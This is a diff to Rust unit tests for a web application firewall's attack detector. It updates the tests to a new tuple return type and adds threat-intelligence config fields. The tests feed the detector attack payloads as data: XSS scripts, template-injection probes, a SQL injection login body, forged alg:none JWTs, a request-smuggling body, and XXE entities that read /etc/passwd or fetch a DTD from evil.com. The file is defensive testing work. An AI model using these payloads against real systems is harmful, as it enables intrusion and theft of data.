@@ -700,6 +700,10 @@ mod tests {
             fn test_threat_intel_config_hub_only() {
                 let config = ThreatIntelligenceConfig {
                     hub_only_mode: true,
+                    behavioral_enabled: false,
+                    min_samples_for_fingerprint: 10,
+                    fingerprint_ttl_secs: 3600,
+                    high_severity_threshold: 70,
                     ..Default::default()
                 };
                 assert!(config.hub_only_mode);
@@ -2504,6 +2508,10 @@ mod hub_only_mode_tests {
     fn test_hub_only_mode_explicit_enable() {
         let config = ThreatIntelligenceConfig {
             hub_only_mode: true,
+            behavioral_enabled: false,
+            min_samples_for_fingerprint: 10,
+            fingerprint_ttl_secs: 3600,
+            high_severity_threshold: 70,
             ..Default::default()
         };
         assert!(config.hub_only_mode);
@@ -2534,6 +2542,10 @@ mod hub_only_mode_tests {
     fn test_hub_only_mode_check_pattern() {
         let config = ThreatIntelligenceConfig {
             hub_only_mode: true,
+            behavioral_enabled: false,
+            min_samples_for_fingerprint: 10,
+            fingerprint_ttl_secs: 3600,
+            high_severity_threshold: 70,
             ..Default::default()
         };
 
@@ -3989,13 +4001,13 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Sqli
         ));
         assert!(matches!(
-            result.as_ref().unwrap().input_location,
+            result.0.as_ref().unwrap().input_location,
             InputLocation::QueryString
         ));
     }
@@ -4010,7 +4022,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_none());
+        assert!(result.0.is_none());
     }
 
     #[test]
@@ -4023,13 +4035,13 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Xss
         ));
         assert!(matches!(
-            result.as_ref().unwrap().input_location,
+            result.0.as_ref().unwrap().input_location,
             InputLocation::QueryString
         ));
     }
@@ -4044,9 +4056,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"<img src=x onerror=alert(1)>"),
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Xss
         ));
     }
@@ -4061,9 +4073,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"{{7*7}}"),
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Ssti
         ));
     }
@@ -4078,9 +4090,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"{{config}}"),
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Ssti
         ));
     }
@@ -4095,9 +4107,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Rfi
         ));
     }
@@ -4112,9 +4124,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::LdapInjection
         ));
     }
@@ -4129,9 +4141,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::XPathInjection
         ));
     }
@@ -4146,9 +4158,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::CmdInjection
         ));
     }
@@ -4163,9 +4175,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::CmdInjection
         ));
     }
@@ -4183,9 +4195,9 @@ mod waf_attack_detection_tests {
             &headers,
             Some(b"0\r\n\r\n"),
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::RequestSmuggling
         ));
     }
@@ -4203,13 +4215,12 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"this body is way too long for the limit"),
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Other
         ));
-        assert!(result
-            .as_ref()
+        assert!(result.0.as_ref()
             .unwrap()
             .fingerprint
             .as_ref()
@@ -4227,7 +4238,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
     }
 
     #[test]
@@ -4243,7 +4254,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_none());
+        assert!(result.0.is_none());
     }
 
     #[test]
@@ -4262,7 +4273,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(sqli_result.is_some());
+        assert!(sqli_result.0.is_some());
 
         let xss_result = detector.check_request(
             &http::Method::GET,
@@ -4271,7 +4282,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(xss_result.is_none());
+        assert!(xss_result.0.is_none());
     }
 
     #[test]
@@ -4284,9 +4295,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::PathTraversal
         ));
     }
@@ -4301,9 +4312,9 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::PathTraversal
         ));
     }
@@ -4318,13 +4329,13 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::PathTraversal
         ));
         assert!(matches!(
-            result.as_ref().unwrap().input_location,
+            result.0.as_ref().unwrap().input_location,
             InputLocation::Path
         ));
     }
@@ -4339,7 +4350,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        if let Some(r) = &result {
+        if let Some(r) = &result.0 {
             eprintln!(
                 "DEBUG: attack_type={:?}, input_location={:?}, matched_pattern={:?}",
                 r.attack_type, r.input_location, r.matched_pattern
@@ -4347,8 +4358,8 @@ mod waf_attack_detection_tests {
         } else {
             eprintln!("DEBUG: result is None");
         }
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             attack_type == AttackType::Ssrf || attack_type == AttackType::Rfi,
             "Expected Ssrf or Rfi, got {:?}",
@@ -4366,8 +4377,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             attack_type == AttackType::Ssrf || attack_type == AttackType::Rfi,
             "Expected Ssrf or Rfi, got {:?}",
@@ -4385,8 +4396,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             attack_type == AttackType::Ssrf || attack_type == AttackType::Rfi,
             "Expected Ssrf or Rfi, got {:?}",
@@ -4404,8 +4415,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             matches!(
                 attack_type,
@@ -4426,8 +4437,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM \"http://evil.com/evil.dtd\">]>"),
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             matches!(
                 attack_type,
@@ -4444,9 +4455,9 @@ mod waf_attack_detection_tests {
         let mut headers = HeaderMap::new();
         headers.insert("authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.".parse().unwrap());
         let result = detector.check_request(&http::Method::GET, "/auth", None, &headers, None);
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Jwt
         ));
     }
@@ -4457,9 +4468,9 @@ mod waf_attack_detection_tests {
         let mut headers = HeaderMap::new();
         headers.insert("authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.".parse().unwrap());
         let result = detector.check_request(&http::Method::GET, "/auth", None, &headers, None);
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Jwt
         ));
     }
@@ -4474,8 +4485,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             matches!(attack_type, AttackType::OpenRedirect | AttackType::Rfi),
             "Expected OpenRedirect or Rfi, got {:?}",
@@ -4493,8 +4504,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             matches!(attack_type, AttackType::OpenRedirect | AttackType::Rfi),
             "Expected OpenRedirect or Rfi, got {:?}",
@@ -4512,8 +4523,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let attack_type = result.as_ref().unwrap().attack_type;
+        assert!(result.0.is_some());
+        let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
             matches!(attack_type, AttackType::OpenRedirect | AttackType::Rfi),
             "Expected OpenRedirect or Rfi, got {:?}",
@@ -4531,13 +4542,13 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"username=admin' OR '1'='1&password=anything"),
         );
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Sqli
         ));
         assert!(matches!(
-            result.as_ref().unwrap().input_location,
+            result.0.as_ref().unwrap().input_location,
             InputLocation::PostBody
         ));
     }
@@ -4551,13 +4562,13 @@ mod waf_attack_detection_tests {
             "session=<script>alert(1)</script>".parse().unwrap(),
         );
         let result = detector.check_request(&http::Method::GET, "/profile", None, &headers, None);
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Xss
         ));
         assert!(matches!(
-            result.as_ref().unwrap().input_location,
+            result.0.as_ref().unwrap().input_location,
             InputLocation::Header(_)
         ));
     }
@@ -4571,13 +4582,13 @@ mod waf_attack_detection_tests {
             "<script>alert('xss')</script>".parse().unwrap(),
         );
         let result = detector.check_request(&http::Method::GET, "/", None, &headers, None);
-        assert!(result.is_some());
+        assert!(result.0.is_some());
         assert!(matches!(
-            result.as_ref().unwrap().attack_type,
+            result.0.as_ref().unwrap().attack_type,
             AttackType::Xss
         ));
         assert!(matches!(
-            result.as_ref().unwrap().input_location,
+            result.0.as_ref().unwrap().input_location,
             InputLocation::Header(_)
         ));
     }
@@ -4600,7 +4611,7 @@ mod waf_attack_detection_tests {
             &headers,
             Some(b"Hello world, this is a normal post body!"),
         );
-        assert!(result.is_none());
+        assert!(result.0.is_none());
     }
 
     #[test]
@@ -4617,7 +4628,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(normal_result.is_none());
+        assert!(normal_result.0.is_none());
 
         let high_result = high_detector.check_request(
             &http::Method::GET,
@@ -4626,7 +4637,7 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(high_result.is_none());
+        assert!(high_result.0.is_none());
     }
 
     #[test]
@@ -4639,8 +4650,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             Some(b"{{7*7}}"),
         );
-        assert!(result.is_some());
-        let detected = result.unwrap();
+        assert!(result.0.is_some());
+        let detected = result.0.unwrap();
         assert!(matches!(
             detected.attack_type,
             AttackType::Xss | AttackType::Sqli | AttackType::Ssti
@@ -4657,8 +4668,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let detected = result.unwrap();
+        assert!(result.0.is_some());
+        let detected = result.0.unwrap();
         assert!(matches!(detected.attack_type, AttackType::Sqli));
     }
 
@@ -4672,8 +4683,8 @@ mod waf_attack_detection_tests {
             &make_headers(),
             None,
         );
-        assert!(result.is_some());
-        let detected = result.unwrap();
+        assert!(result.0.is_some());
+        let detected = result.0.unwrap();
         assert!(matches!(detected.attack_type, AttackType::Xss));
     }
 }
